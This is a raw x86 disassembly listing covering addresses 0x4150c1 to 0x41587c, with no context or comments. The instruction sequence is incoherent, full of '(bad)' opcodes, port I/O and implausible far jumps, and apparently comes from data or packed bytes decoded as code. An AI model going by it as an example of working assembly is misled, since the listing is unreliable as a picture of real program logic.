  4150c1:	cmp    esi,DWORD PTR [esi+0x106998e5]
  4150c7:	cmp    eax,0xf3198355
  4150cc:	in     al,dx
  4150cd:	daa    
  4150ce:	pop    es
  4150cf:	or     BYTE PTR [ecx-0x1a0cd165],dl
  4150d5:	dec    ebx
  4150d6:	dec    esp
  4150d7:	mov    WORD PTR [edx],ss
  4150d9:	neg    BYTE PTR [esp+ebx*8]
  4150dc:	dec    eax
  4150dd:	mov    ah,0x75
  4150df:	xchg   esp,eax
  4150e0:	call   WORD PTR [ebx-0x1a0e0e99]
  4150e7:	cld    
  4150e8:	(bad)  
  4150e9:	mov    eax,0xf389baeb
  4150ee:	mov    ebp,0x3e99e6db
  4150f3:	aam    0xfc
  4150f5:	or     al,0xc5
  4150f7:	out    0x12,eax
  4150f9:	and    esp,eax
  4150fb:	adc    bl,BYTE PTR [esi]
  4150fd:	fwait
  4150fe:	xor    dl,bh
  415100:	mov    ah,0x34
  415102:	out    0xa4,al
  415104:	mov    BYTE PTR [esi-0x15],al
  415107:	push   esi
  415108:	bound  ebp,QWORD PTR [ebx+0x7d]
  41510b:	inc    edx
  41510c:	xor    eax,0x1cb96857
  415111:	cmp    al,0xb3
  415113:	mov    eax,es:0x837c82a4
  415119:	add    al,0x74
  41511b:	rol    DWORD PTR [eax+0x39],cl
  41511e:	leave  
  41511f:	test   BYTE PTR [ebx+0x1c],0xf9
  415123:	push   esp
  415124:	cmp    eax,0x41dcb482
  415129:	ins    DWORD PTR es:[edi],dx
  41512a:	aad    0xd8
  41512c:	test   eax,0x40ec8d0d
  415131:	push   edi
  415132:	push   ss
  415133:	mov    esi,0xb7d94f6b
  415138:	ins    DWORD PTR es:[edi],dx
  415139:	adc    ebx,DWORD PTR [ecx]
  41513b:	mov    bh,0x89
  41513d:	or     bh,ch
  41513f:	sti    
  415140:	or     dl,dh
  415142:	and    ebx,ebx
  415144:	and    ebx,0xffffff8e
  415147:	xor    ebp,DWORD PTR [edx+0x1a]
  41514a:	and    eax,ebp
  41514c:	fnstsw WORD PTR [ecx+0x2c537612]
  415152:	test   BYTE PTR [ebp-0x57],bl
  415155:	xor    BYTE PTR [ecx+0x10],0x60
  415159:	scas   eax,DWORD PTR es:[edi]
  41515a:	daa    
  41515b:	cmc    
  41515c:	fisub  DWORD PTR [ebp-0x6d]
  41515f:	add    BYTE PTR [eax+ebx*1+0x7a],ah
  415163:	push   0xa8a904d2
  415168:	arpl   WORD PTR [edx-0x49],si
  41516b:	int3   
  41516c:	mov    eax,ds:0xfa52a629
  415171:	mov    ebp,0xb8077a6c
  415176:	pop    ebx
  415177:	pop    edi
  415178:	jb     0x41514c
  41517a:	ss ret 
  41517c:	lock mov bh,0x30
  41517f:	xlat   BYTE PTR ds:[ebx]
  415180:	adc    al,0xf7
  415182:	adc    ebx,ebp
  415184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415185:	sbb    eax,0xb66e9b21
  41518a:	rcr    esp,1
  41518c:	mov    ch,0x22
  41518e:	pop    esi
  41518f:	push   edi
  415190:	pop    es
  415191:	push   edx
  415192:	pop    ebx
  415193:	pop    ds
  415194:	mov    esi,0xd6264c41
  415199:	clc    
  41519a:	pop    es
  41519b:	lahf   
  41519c:	ins    DWORD PTR es:[edi],dx
  41519d:	scas   al,BYTE PTR es:[edi]
  41519e:	sbb    al,0xfa
  4151a0:	out    0x4b,eax
  4151a2:	push   ss
  4151a3:	mov    eax,0x54e199e1
  4151a8:	jo     0x4151cd
  4151aa:	jp     0x41514b
  4151ac:	shl    DWORD PTR [edx-0x56],1
  4151af:	(bad)  
  4151b0:	pop    ebp
  4151b1:	jne    0x4151ee
  4151b3:	jl     0x415189
  4151b5:	sar    BYTE PTR [ecx],1
  4151b7:	enter  0x463e,0x26
  4151bb:	xchg   esp,eax
  4151bc:	repz in eax,dx
  4151be:	sahf   
  4151bf:	outs   dx,BYTE PTR ds:[esi]
  4151c0:	sbb    edx,eax
  4151c2:	fisttp DWORD PTR [ebp-0x2a54bd59]
  4151c8:	mov    al,0xa5
  4151ca:	or     dl,BYTE PTR ds:0x46e45245
  4151d0:	(bad)  
  4151d1:	cmc    
  4151d2:	mov    eax,es:0x909e4224
  4151d8:	mov    ah,0xb9
  4151da:	push   edi
  4151db:	icebp  
  4151dc:	aam    0xbd
  4151de:	inc    DWORD PTR [ebx+0x17]
  4151e1:	xchg   esp,eax
  4151e2:	test   al,0x5a
  4151e4:	push   esp
  4151e5:	mov    ebx,0xf2bc6c35
  4151ea:	xchg   DWORD PTR [ebp+0x39],edx
  4151ed:	pop    ecx
  4151ee:	cmp    BYTE PTR [esi+0x39],cl
  4151f1:	mov    ds:0xb8b6e9c0,eax
  4151f6:	and    dh,BYTE PTR [ecx]
  4151f8:	mov    edx,DWORD PTR [ebp-0x12]
  4151fb:	push   ebp
  4151fc:	lods   al,BYTE PTR ds:[esi]
  4151fd:	shl    BYTE PTR [eax],1
  4151ff:	in     al,0x3c
  415201:	mov    bl,0xa9
  415203:	dec    eax
  415204:	mov    esi,0xa601e898
  415209:	repnz pop ss
  41520b:	iret   
  41520c:	arpl   WORD PTR [eax],di
  41520e:	jne    0x4151d8
  415210:	jmp    0xd53f9746
  415215:	mov    ds:0x613c0ca5,eax
  41521a:	aam    0xd8
  41521c:	aam    0xb3
  41521e:	jae    0x4151a5
  415220:	inc    esi
  415221:	cmp    DWORD PTR [ebx],ebx
  415223:	xor    ah,BYTE PTR [ecx]
  415225:	neg    DWORD PTR [ebp+0x79]
  415228:	sbb    ecx,ebp
  41522a:	repz push edi
  41522c:	fidiv  WORD PTR [edx+0x6]
  41522f:	call   0x59cc:0xff73aa13
  415236:	fldenv [esi]
  415238:	jmp    0xdfef8688
  41523d:	retf   0x1582
  415240:	push   ss
  415241:	out    dx,eax
  415242:	add    BYTE PTR [ecx],cl
  415244:	mov    ebx,0x3108b474
  415249:	adc    bl,al
  41524b:	mov    bl,0xa2
  41524d:	adc    BYTE PTR [ecx],dl
  41524f:	push   ss
  415250:	mov    es,WORD PTR [ebx-0x6]
  415253:	or     DWORD PTR [ebx],0x32
  415256:	scas   al,BYTE PTR es:[edi]
  415257:	mov    dl,0x96
  415259:	inc    DWORD PTR [edi-0x42f451d9]
  41525f:	jnp    0x415274
  415261:	and    DWORD PTR [edx+0x271bec49],eax
  415267:	shl    BYTE PTR [esi+0x1b],1
  41526a:	push   ecx
  41526b:	pusha  
  41526c:	hlt    
  41526d:	jle    0x415278
  41526f:	(bad)  
  415270:	pop    esp
  415271:	jno    0x4151f4
  415273:	ret    
  415274:	add    esp,0xffffffcc
  415277:	mov    cl,0x4b
  415279:	clc    
  41527a:	cdq    
  41527b:	sub    al,0xb9
  41527d:	jns    0x41524d
  41527f:	push   edi
  415280:	xchg   ecx,eax
  415281:	or     ebp,eax
  415283:	and    DWORD PTR [eax+0x6],esp
  415286:	lods   eax,DWORD PTR ds:[esi]
  415287:	ja     0x41520a
  415289:	mov    ss,WORD PTR [ebx+0x24]
  41528c:	(bad)
  41528f:	into   
  415290:	js     0x4152be
  415292:	mov    ebp,0xab976da0
  415297:	pop    ss
  415298:	mov    ds,WORD PTR [esi]
  41529a:	mov    esp,0x40142b16
  41529f:	adc    al,0xbf
  4152a1:	adc    ch,ah
  4152a3:	jae    0x41531a
  4152a5:	xchg   BYTE PTR [edx+0x375aa859],ch
  4152ab:	lahf   
  4152ac:	cmp    ebx,DWORD PTR [eax+0x494d631]
  4152b2:	fstp   TBYTE PTR es:[esp+eax*8+0x1d]
  4152b7:	xor    bl,dl
  4152b9:	pop    es
  4152ba:	xchg   ebp,eax
  4152bb:	leave  
  4152bc:	call   0x970d:0x71c49819
  4152c3:	out    0xd2,eax
  4152c5:	(bad)  [ebx+esi*4-0x15]
  4152c9:	pop    ebx
  4152ca:	sahf   
  4152cb:	je     0x415257
  4152cd:	sar    BYTE PTR [ecx-0x6a],cl
  4152d0:	shl    edx,cl
  4152d2:	or     bh,BYTE PTR [esi-0x41563de9]
  4152d8:	dec    ecx
  4152d9:	pop    ebp
  4152da:	aam    0xd0
  4152dc:	mov    edi,0xa9ec241a
  4152e1:	push   ecx
  4152e2:	fadd   DWORD PTR [ebx]
  4152e4:	sub    ecx,ebp
  4152e6:	adc    BYTE PTR [eax-0x7785b76c],dh
  4152ec:	push   DWORD PTR [ecx]
  4152ee:	pop    edx
  4152ef:	ss push ecx
  4152f1:	aaa    
  4152f2:	mov    ch,0x37
  4152f4:	push   0xffffffd7
  4152f6:	loop   0x4152fc
  4152f8:	and    edx,DWORD PTR [edi+0x1e]
  4152fb:	push   edx
  4152fc:	retf   0x24cd
  4152ff:	add    cl,ah
  415301:	dec    edi
  415302:	and    eax,0xfe9d813
  415307:	pop    ebx
  415308:	xchg   edi,eax
  415309:	xchg   ebx,eax
  41530a:	jno    0x4152f4
  41530c:	mov    bh,0xc8
  41530e:	jb     0x415331
  415310:	scas   al,BYTE PTR es:[edi]
  415311:	mov    edx,0x8a64e683
  415316:	sbb    BYTE PTR [ebp-0x133ba2b4],0x61
  41531d:	popf   
  41531e:	mov    ebp,DWORD PTR [ebx-0x33]
  415321:	mov    esp,ebp
  415323:	shr    ch,cl
  415325:	xor    eax,0xb617625d
  41532a:	mov    WORD PTR [esp+ecx*1],cs
  41532d:	or     dl,BYTE PTR [edi]
  41532f:	das    
  415330:	jnp    0x415339
  415332:	aam    0x96
  415334:	ror    DWORD PTR [edi+0x59],0xe0
  415338:	push   ecx
  415339:	xchg   DWORD PTR [ebx+0x4b0afb80],eax
  41533f:	push   0x42
  415341:	mov    ds:0xc32ac953,al
  415346:	mov    al,0x50
  415348:	pop    ebx
  415349:	jge    0x4153c9
  41534b:	cdq    
  41534c:	sub    BYTE PTR [edx-0x10da86ca],al
  415352:	cmp    BYTE PTR [eax-0x34],dh
  415355:	push   ss
  415356:	cld    
  415357:	lods   al,BYTE PTR ds:[esi]
  415358:	sbb    bh,BYTE PTR [edi+0x4a0563f7]
  41535e:	and    bh,0xba
  415361:	lods   eax,DWORD PTR ds:[esi]
  415362:	stos   DWORD PTR es:[edi],eax
  415363:	push   edi
  415364:	xchg   DWORD PTR [ebx-0x27],ebx
  415367:	fld    QWORD PTR [edx]
  415369:	in     eax,dx
  41536a:	jmp    0x5a5664b3
  41536f:	in     eax,dx
  415370:	popf   
  415371:	and    ecx,DWORD PTR [eax]
  415373:	mov    dh,0xec
  415375:	jmp    0x4153cd
  415377:	jns    0x4153cc
  415379:	push   ecx
  41537a:	test   eax,0xb25c7140
  41537f:	xor    al,0x5e
  415381:	xchg   esi,eax
  415382:	mov    ah,0x4b
  415384:	shld   DWORD PTR [eax+0x5],ebx,0x48
  415389:	push   esp
  41538a:	mov    eax,0x1ddd3f4a
  41538f:	sub    eax,ebp
  415391:	mov    ebp,0x5aedd142
  415396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415397:	jle    0x4153ef
  415399:	arpl   WORD PTR [ebx],ax
  41539b:	cmp    al,0x7f
  41539d:	inc    eax
  41539e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41539f:	shl    dl,cl
  4153a1:	aam    0x88
  4153a3:	xor    ah,ah
  4153a5:	not    DWORD PTR [ebx+0x3cd4f50c]
  4153ab:	fisubr DWORD PTR [ebp+0x74]
  4153ae:	mov    eax,ds:0x134afe27
  4153b3:	scas   eax,DWORD PTR es:[edi]
  4153b4:	aad    0xa6
  4153b6:	pop    esi
  4153b7:	dec    esi
  4153b8:	adc    edx,DWORD PTR [edi-0x5a]
  4153bb:	out    0x87,al
  4153bd:	enter  0x9c8d,0xd2
  4153c1:	cmp    BYTE PTR [esp-0x495e930b],dl
  4153c8:	mov    dl,dl
  4153ca:	pop    ecx
  4153cb:	rcr    BYTE PTR [edi-0xbb3b235],cl
  4153d1:	fcmovne st,st(4)
  4153d3:	test   cl,0x1b
  4153d6:	pop    edx
  4153d7:	inc    esp
  4153d8:	push   cs
  4153d9:	imul   ebx,DWORD PTR [ebx-0x59b2b0de],0x71
  4153e0:	mov    edi,0x76e2ae20
  4153e5:	jb     0x41537e
  4153e7:	push   esi
  4153e8:	adc    BYTE PTR [eax+esi*1],dh
  4153eb:	jae    0x415419
  4153ed:	dec    eax
  4153ee:	popf   
  4153ef:	fwait
  4153f0:	jp     0x4153cb
  4153f2:	xor    bh,cl
  4153f4:	xchg   edi,eax
  4153f5:	outs   dx,DWORD PTR ds:[esi]
  4153f6:	dec    esi
  4153f7:	ds gs mov cl,0xc
  4153fb:	cmp    edi,DWORD PTR [ebx-0x37]
  4153fe:	jecxz  0x415423
  415400:	and    al,0x54
  415402:	das    
  415403:	shl    BYTE PTR [ebp+0x99028b8],cl
  415409:	push   ds
  41540a:	jmp    0x48fc:0xc6a6cc97
  415411:	test   eax,0x86ef485d
  415416:	jmp    0x4153a1
  415418:	or     ah,bh
  41541a:	loope  0x4153d0
  41541c:	(bad)
  415420:	mov    ebp,0x3baee1c0
  415425:	xor    ebx,DWORD PTR ds:0x4a93cddd
  41542b:	push   edi
  41542c:	pop    ds
  41542d:	mov    cl,0x5b
  41542f:	mov    ds:0x7fab738f,eax
  415434:	ja     0x41541c
  415436:	mul    dl
  415438:	mov    bl,dl
  41543a:	popf   
  41543b:	add    eax,0xed23ee4c
  415440:	xor    al,dl
  415442:	xchg   esi,eax
  415443:	icebp  
  415444:	dec    esi
  415445:	jge    0x4153ee
  415447:	in     eax,dx
  415448:	inc    ebp
  415449:	into   
  41544a:	xlat   BYTE PTR ds:[ebx]
  41544b:	push   0x6a576b89
  415450:	jne    0x41549b
  415452:	jno    0x4154a3
  415454:	cmp    eax,0x3f906cc
  415459:	push   ebx
  41545a:	or     BYTE PTR [edi],bh
  41545c:	cmp    BYTE PTR [ebx+eax*8],bh
  41545f:	xor    BYTE PTR [ebp+0x2a],cl
  415462:	stos   DWORD PTR es:[edi],eax
  415463:	scas   al,BYTE PTR es:[edi]
  415464:	jae    0x4154c2
  415466:	pop    esp
  415467:	enter  0xd5c3,0xbf
  41546b:	mov    edx,gs
  41546d:	sub    DWORD PTR [ebp-0x52],esi
  415470:	inc    ebx
  415471:	out    0xb1,eax
  415473:	xor    al,0x9e
  415475:	imul   edi,DWORD PTR [di+0x64f7],0x14
  41547b:	pop    esp
  41547c:	jmp    0x8e8f:0xbe3d2831
  415483:	imul   ebp,DWORD PTR [edx],0xffffffb4
  415486:	pop    esp
  415487:	pop    esp
  415488:	push   esp
  415489:	add    DWORD PTR [ebx-0x56a36189],esp
  41548f:	xchg   esp,eax
  415490:	add    DWORD PTR [ecx+0x2375f492],0xf0bf7793
  41549a:	js     0x4154c6
  41549c:	retf   0x59a3
  41549f:	mov    bh,0xb5
  4154a1:	dec    ecx
  4154a2:	jbe    0x4154b7
  4154a4:	pop    ebx
  4154a5:	std    
  4154a6:	xor    bh,BYTE PTR [ebx]
  4154a8:	lahf   
  4154a9:	arpl   WORD PTR [ecx+0x4e1f1ae],cx
  4154af:	mov    DWORD PTR [edi+0x77],0xeea8923f
  4154b6:	scas   al,BYTE PTR es:[edi]
  4154b7:	jnp    0x415440
  4154b9:	pop    ecx
  4154ba:	push   0xe26dd75f
  4154bf:	or     DWORD PTR [ebx-0x45783120],0xffffff8d
  4154c6:	sub    eax,0x8898b30f
  4154cb:	into   
  4154cc:	xchg   BYTE PTR [esi+0x22],ch
  4154cf:	mov    dl,0x2
  4154d1:	dec    eax
  4154d2:	mov    ch,0xf1
  4154d4:	sub    al,0xe9
  4154d6:	cmp    edx,edx
  4154d8:	jne    0x415552
  4154da:	das    
  4154db:	and    dl,ch
  4154dd:	sbb    DWORD PTR [ebx],ecx
  4154df:	sbb    ebp,DWORD PTR [eax+0x22]
  4154e2:	rcl    BYTE PTR [eax+0x6d],0x5f
  4154e6:	jmp    0x415523
  4154e8:	mov    cl,0x55
  4154ea:	loop   0x4154a9
  4154ec:	pop    eax
  4154ed:	outs   dx,DWORD PTR ds:[esi]
  4154ee:	jns    0x4154f4
  4154f0:	inc    edi
  4154f1:	inc    edi
  4154f2:	clc    
  4154f3:	aas    
  4154f4:	mov    eax,ds:0xb2d319a9
  4154f9:	mov    esi,0x41fea0ce
  4154fe:	dec    ebp
  4154ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415500:	push   edx
  415501:	inc    edi
  415502:	jl     0x4154ab
  415504:	and    esi,0xfffffff9
  415507:	pop    ds
  415508:	repz cwde 
  41550a:	pop    ebx
  41550b:	mov    esi,0x446891ea
  415510:	and    BYTE PTR ds:[edx],cl
  415513:	mov    ch,0xbd
  415515:	cmp    ebx,DWORD PTR [edi]
  415517:	xchg   edi,eax
  415518:	je     0x415512
  41551a:	adc    eax,0xe2e100ef
  41551f:	in     eax,dx
  415520:	jnp    0x4154bf
  415522:	mov    al,0x39
  415524:	mov    bl,0xff
  415526:	cmc    
  415527:	mov    bh,0xab
  415529:	addr16 jnp 0x4154fd
  41552c:	add    BYTE PTR [edx],ch
  41552e:	push   0xeeb550e0
  415533:	mov    edx,0xd706d29b
  415538:	cld    
  415539:	fdiv   QWORD PTR [edx-0x6915649]
  41553f:	aad    0xd5
  415541:	xlat   BYTE PTR ds:[ebx]
  415542:	xor    ch,BYTE PTR [ebp+0x39]
  415545:	sub    BYTE PTR [eax+0x49],0xf3
  415549:	fbstp  TBYTE PTR [edx]
  41554b:	or     eax,eax
  41554d:	cmp    ah,bl
  41554f:	dec    edx
  415550:	sub    BYTE PTR [ecx+0x3b],ah
  415553:	ins    BYTE PTR es:[edi],dx
  415554:	(bad)  
  415555:	xor    esi,ebx
  415557:	out    dx,al
  415558:	cmp    al,0xc2
  41555a:	imul   eax,DWORD PTR [edi],0x7e
  41555d:	xlat   BYTE PTR ds:[ebx]
  41555e:	xchg   edi,eax
  41555f:	iret   
  415560:	fs pop ecx
  415562:	ins    DWORD PTR es:[edi],dx
  415563:	mov    eax,0x4fd122f2
  415568:	jl     0x415584
  41556a:	mov    DWORD PTR [edx-0x62f1a5b],edx
  415570:	dec    ebx
  415571:	jmp    0x415594
  415573:	mov    dh,0x41
  415575:	mov    ch,al
  415577:	sub    BYTE PTR [edx+0x25],bl
  41557a:	loop   0x415560
  41557c:	lods   eax,DWORD PTR ds:[esi]
  41557d:	rol    BYTE PTR [edi+0x37],cl
  415580:	cmp    ecx,DWORD PTR [ebp+0x592f783]
  415586:	push   esp
  415587:	or     DWORD PTR [ebx],ebx
  415589:	mov    ecx,0x4303b737
  41558e:	pop    ebp
  41558f:	outs   dx,DWORD PTR ds:[esi]
  415590:	(bad)  
  415591:	sub    DWORD PTR [ebx+0x2ffc1fbd],esi
  415597:	jecxz  0x415554
  415599:	out    dx,al
  41559a:	jle    0x415542
  41559c:	shl    BYTE PTR [ebx-0x431e75],cl
  4155a2:	and    DWORD PTR [ecx+eax*1],eax
  4155a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a6:	loop   0x4155f3
  4155a8:	mov    esi,0x10029c4e
  4155ad:	inc    ebx
  4155ae:	jb     0x4155b2
  4155b0:	ss mov edi,0xdf72eca0
  4155b6:	mov    cs,WORD PTR [ecx+0x154323d2]
  4155bc:	mov    ch,0xfb
  4155be:	aad    0x7a
  4155c0:	push   ebx
  4155c1:	in     al,0x26
  4155c3:	xor    dh,ch
  4155c5:	jp     0x41560b
  4155c7:	jg     0x415627
  4155c9:	add    cl,cl
  4155cb:	std    
  4155cc:	dec    eax
  4155cd:	rcl    dh,cl
  4155cf:	xchg   BYTE PTR [eax+0x6d6f0fa3],ch
  4155d5:	ficomp WORD PTR [ecx]
  4155d7:	sub    dh,0xfd
  4155da:	cmp    esp,esi
  4155dc:	out    dx,eax
  4155dd:	mov    bl,0x4f
  4155df:	fs es dec ebx
  4155e2:	dec    edi
  4155e3:	mov    ds:0xe51e98ec,eax
  4155e8:	jb     0x4155ed
  4155ea:	push   ebp
  4155eb:	inc    esp
  4155ec:	lds    ecx,FWORD PTR [edx]
  4155ee:	or     BYTE PTR [ecx+0x5c22fdb4],ch
  4155f4:	pop    eax
  4155f5:	pop    edi
  4155f6:	dec    edx
  4155f7:	stos   BYTE PTR es:[edi],al
  4155f8:	push   edx
  4155f9:	pop    edx
  4155fa:	adc    eax,0x50133b47
  4155ff:	ret    
  415600:	retf   
  415601:	and    esp,edx
  415603:	push   esp
  415604:	ins    BYTE PTR es:[edi],dx
  415605:	mov    esi,DWORD PTR cs:0xb25d8f12
  41560c:	ds popa 
  41560e:	mov    WORD PTR [esi],ss
  415610:	or     eax,DWORD PTR [ebp+ecx*8+0x2d650bc]
  415617:	iret   
  415618:	(bad)  
  415619:	lea    esi,[esi-0x6adde858]
  41561f:	daa    
  415620:	jecxz  0x415667
  415622:	jg     0x415610
  415624:	mov    bl,0x9e
  415626:	loope  0x4155bb
  415628:	push   cs
  415629:	int3   
  41562a:	xchg   ecx,eax
  41562b:	cmp    BYTE PTR [eax],cl
  41562d:	jmp    0x41565d
  41562f:	cmc    
  415630:	sahf   
  415631:	inc    ebp
  415632:	jno    0x415675
  415634:	clc    
  415635:	cli    
  415636:	lods   eax,DWORD PTR ds:[esi]
  415637:	pop    ebp
  415638:	(bad)  
  415639:	std    
  41563a:	sub    WORD PTR [eax-0x42],0x25ac
  415640:	xchg   ecx,eax
  415641:	ins    BYTE PTR es:[edi],dx
  415642:	and    ah,BYTE PTR [ecx+ebp*2-0x1d956b59]
  415649:	add    esp,DWORD PTR [eax+edi*4]
  41564c:	sub    ebx,DWORD PTR [ecx+0x62dfd5e0]
  415652:	enter  0x67c2,0x20
  415656:	in     eax,0x39
  415658:	js     0x4155ec
  41565a:	call   0x4680b3f2
  41565f:	into   
  415660:	mov    fs,WORD PTR [esi-0x7e414844]
  415666:	cs pop es
  415668:	add    DWORD PTR [ecx],ebp
  41566a:	fstp   QWORD PTR [esi-0x1fe1c944]
  415670:	push   esi
  415672:	jge    0x415634
  415674:	rcr    DWORD PTR [bx+di-0x1f],1
  415678:	sub    esp,DWORD PTR [eax+0x7c82d34a]
  41567e:	or     ah,BYTE PTR [eax-0x63]
  415681:	(bad)  
  415682:	jnp    0x4156b8
  415684:	sub    cl,bh
  415686:	pop    eax
  415687:	scas   eax,DWORD PTR es:[edi]
  415688:	clc    
  415689:	imul   DWORD PTR [edx]
  41568b:	or     DWORD PTR [edx],esi
  41568d:	cs sbb al,0x74
  415690:	sbb    esp,ecx
  415692:	or     DWORD PTR [edx],edi
  415694:	iret   
  415695:	pop    ebx
  415697:	push   cs
  415698:	iret   
  415699:	ja     0x415647
  41569b:	cwde   
  41569c:	test   DWORD PTR [ecx-0x63bc6fc2],0x4ef4cc6
  4156a6:	mov    cl,0xf9
  4156a8:	jl     0x4156fa
  4156aa:	icebp  
  4156ab:	dec    ebx
  4156ac:	aaa    
  4156ad:	ss push ecx
  4156af:	aad    0xf4
  4156b1:	xchg   BYTE PTR [ebp+0x3e0df562],ch
  4156b7:	xlat   BYTE PTR ds:[ebx]
  4156b8:	adc    al,0xf1
  4156ba:	lods   al,BYTE PTR ds:[esi]
  4156bb:	into   
  4156bc:	and    cl,bh
  4156be:	mov    eax,0xa49f6180
  4156c3:	jae    0x41569c
  4156c5:	icebp  
  4156c6:	jae    0x41571d
  4156c8:	sub    eax,0x8a5ebd7b
  4156cd:	adc    ch,BYTE PTR [esi]
  4156cf:	leave  
  4156d0:	adc    dh,BYTE PTR [ecx]
  4156d2:	adc    BYTE PTR [ebp-0x55],dh
  4156d5:	cmp    al,0xeb
  4156d7:	int    0xad
  4156d9:	jne    0x4156db
  4156db:	sti    
  4156dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156de:	or     DWORD PTR ss:[edi+esi*1+0x2e603cf8],ebp
  4156e6:	xor    BYTE PTR [edx+ebp*8+0x6c],al
  4156ea:	mov    bl,0x50
  4156ec:	ss fwait
  4156ee:	repz out 0xf2,al
  4156f1:	pop    esi
  4156f2:	out    dx,al
  4156f3:	inc    esp
  4156f4:	addr16 ja 0x4156f4
  4156f7:	cld    
  4156f8:	inc    edx
  4156f9:	aad    0x2b
  4156fb:	cdq    
  4156fc:	jge    0x415683
  4156fe:	fnstcw WORD PTR [ecx-0x2a]
  415701:	adc    eax,DWORD PTR [esi]
  415703:	and    al,0xd5
  415705:	(bad)  
  415706:	imul   DWORD PTR [ebx+0x4d]
  415709:	(bad)  
  41570a:	mov    edi,0xfb7803a2
  41570f:	imul   esi,DWORD PTR [ecx],0xcd2de08e
  415715:	popa   
  415716:	int3   
  415717:	mov    al,ds:0xf068e74d
  41571c:	inc    eax
  41571d:	pop    es
  41571e:	dec    ebp
  41571f:	dec    cx
  415721:	cmp    BYTE PTR [ecx],0xa2
  415724:	lea    eax,[edx+0x32]
  415727:	fadd   st(1),st
  415729:	rol    ebp,0x9f
  41572c:	xor    eax,0x2f616c6f
  415731:	jecxz  0x415764
  415733:	pop    esi
  415734:	xchg   esp,eax
  415735:	out    dx,eax
  415736:	es jmp 0x4157a2
  415739:	out    dx,eax
  41573a:	in     eax,dx
  41573b:	repnz cmp BYTE PTR [ecx-0x4af7ff64],ch
  415742:	lea    esi,[ebx+0x50]
  415745:	jae    0x4156f5
  415747:	and    al,0x36
  415749:	mov    edi,0xc1f9b72a
  41574e:	dec    ecx
  41574f:	push   cs
  415750:	sar    esi,0xac
  415753:	mov    ecx,edx
  415755:	sub    esi,DWORD PTR [ecx]
  415757:	test   al,0x77
  415759:	sbb    al,0xbe
  41575b:	imul   BYTE PTR [ecx+0xa71fd3f]
  415761:	hlt    
  415762:	xchg   esi,eax
  415763:	sub    esp,esi
  415765:	daa    
  415766:	dec    esi
  415767:	aad    0xb7
  415769:	ss mov ds:0xaa2cd143,eax
  415770:	icebp  
  415771:	pop    esi
  415772:	jmp    0x415762
  415774:	cmp    al,ch
  415776:	int3   
  415777:	xor    al,0xb6
  415779:	jne    0x4157e2
  41577b:	mov    edi,ebx
  41577d:	xchg   edi,eax
  41577e:	jnp    0x415729
  415780:	jno    0x4157c6
  415782:	sar    BYTE PTR gs:[eax-0x73],cl
  415786:	xchg   edi,eax
  415787:	add    BYTE PTR [esi+edx*1-0x660cd673],0xd0
  41578f:	arpl   WORD PTR [esi],si
  415791:	push   0x94477cc3
  415796:	outs   dx,BYTE PTR ds:[esi]
  415797:	mov    esp,0xae1e3b6a
  41579c:	xor    ecx,esi
  41579e:	mov    edi,0xf1cc9db4
  4157a3:	mov    ds:0x274a586,eax
  4157a8:	test   eax,0xc10755b2
  4157ad:	adc    eax,0xc361f568
  4157b2:	sbb    dl,dl
  4157b4:	cmp    bh,ah
  4157b6:	adc    bh,BYTE PTR [edi-0x78118f7b]
  4157bc:	stos   DWORD PTR es:[edi],eax
  4157bd:	and    eax,0xee2a5eb8
  4157c2:	mov    es,WORD PTR [ebx-0x2f]
  4157c5:	cmp    BYTE PTR [eax-0x51a80cf4],dl
  4157cb:	out    0x2a,eax
  4157cd:	int    0xf0
  4157cf:	shl    DWORD PTR ds:0x1129798e,0x57
  4157d6:	and    edx,DWORD PTR [ecx-0x1f63ebce]
  4157dc:	fbstp  TBYTE PTR [edi-0x30]
  4157df:	add    al,0xa2
  4157e1:	jbe    0x415798
  4157e3:	inc    edi
  4157e4:	pop    ecx
  4157e5:	cld    
  4157e6:	push   esp
  4157e7:	push   edx
  4157e8:	cmc    
  4157e9:	ins    DWORD PTR es:[edi],dx
  4157ea:	cmp    eax,0x3360dd17
  4157ef:	xchg   BYTE PTR [esi+esi*2],dl
  4157f2:	xlat   BYTE PTR ds:[ebx]
  4157f3:	jl     0x415874
  4157f5:	retf   0xad4
  4157f8:	and    BYTE PTR [edx+0x6d],ah
  4157fb:	fst    QWORD PTR [eax]
  4157fd:	dec    edi
  4157fe:	or     eax,0x6a8fccb2
  415803:	inc    ebp
  415804:	adc    BYTE PTR [edx+0x3],dl
  415807:	mov    bl,0xd8
  415809:	or     DWORD PTR [ebx],0x2f92b3ef
  41580f:	adc    ebp,DWORD PTR [ecx+ecx*8+0x55f474a8]
  415816:	jns    0x415869
  415818:	dec    esi
  415819:	adc    al,BYTE PTR [ebx-0x18f3e26b]
  41581f:	es jecxz 0x415889
  415822:	(bad)
  415826:	sti    
  415827:	push   edx
  415828:	stos   BYTE PTR es:[edi],al
  415829:	xor    eax,0x1b86f86c
  41582e:	rcr    edi,cl
  415830:	jecxz  0x4157e0
  415832:	lods   al,BYTE PTR ds:[esi]
  415833:	xchg   ecx,eax
  415834:	fild   DWORD PTR [ebx]
  415836:	add    dh,0x4
  415839:	arpl   WORD PTR [esi+0x5d],sp
  41583c:	or     esi,esi
  41583e:	and    al,0xd8
  415840:	gs jge 0x4157f9
  415843:	pusha  
  415844:	shr    DWORD PTR [ebx+0x65fed32f],0x4b
  41584b:	lods   eax,DWORD PTR ds:[esi]
  41584c:	inc    ebx
  41584d:	or     DWORD PTR ds:0xb7ea9aa9,eax
  415853:	pop    edx
  415854:	loop   0x415834
  415856:	mov    ?,WORD PTR [eax]
  415858:	fwait
  415859:	pop    esp
  41585a:	inc    edi
  41585b:	fild   WORD PTR [ebp+0x4a]
  41585e:	scas   eax,DWORD PTR es:[edi]
  41585f:	movmskps edi,xmm5
  415862:	cmp    al,0x57
  415864:	sti    
  415865:	cmc    
  415866:	mov    ah,0x1e
  415868:	sahf   
  415869:	jmp    DWORD PTR [ebp+0x2c328db3]
  41586f:	mov    bl,0xc3
  415871:	aad    0x8c
  415873:	jle    0x4158e5
  415875:	vmwrite edx,DWORD PTR [ecx]
  415878:	sub    DWORD PTR [edx],0xffffffd8
  41587b:	leave  
  41587c:	dec    ecx
